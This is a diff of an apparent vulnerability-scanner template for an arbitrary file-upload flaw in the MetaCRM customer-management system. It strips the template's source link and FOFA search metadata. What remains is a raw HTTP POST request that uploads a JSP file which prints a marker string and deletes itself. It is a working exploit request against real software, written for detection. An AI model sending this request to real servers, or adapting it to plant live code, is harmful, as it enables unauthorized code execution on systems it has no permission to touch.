@@ -3,12 +3,8 @@ info:
   name: MetaCRM客户关系管理系统 upload 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gy95mddte7ad7rdg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gy95mddte7ad7rdg
-    fofa: product="美特软件-MetaCRM6"
 http:
 - raw:
   - 'POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
@@ -20,8 +16,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundary0Mh3BfgWszxRFokh
 
 
@@ -29,8 +23,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     <% out.print("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
@@ -42,8 +34,6 @@ http:
     Content-Disposition: form-data; name="key"
 
 
-
-
     null
 
 
@@ -51,8 +41,6 @@ http:
 
 
     Content-Disposition: form-data; name="form"
-
-
 
 
     null
@@ -64,8 +52,6 @@ http:
     Content-Disposition: form-data; name="field"
 
 
-
-
     null
 
 
@@ -75,8 +61,6 @@ http:
     Content-Disposition: form-data; name="filetitile"
 
 
-
-
     null
 
 
@@ -84,8 +68,6 @@ http:
 
 
     Content-Disposition: form-data; name="filefolder"
-
-
 
 
     null
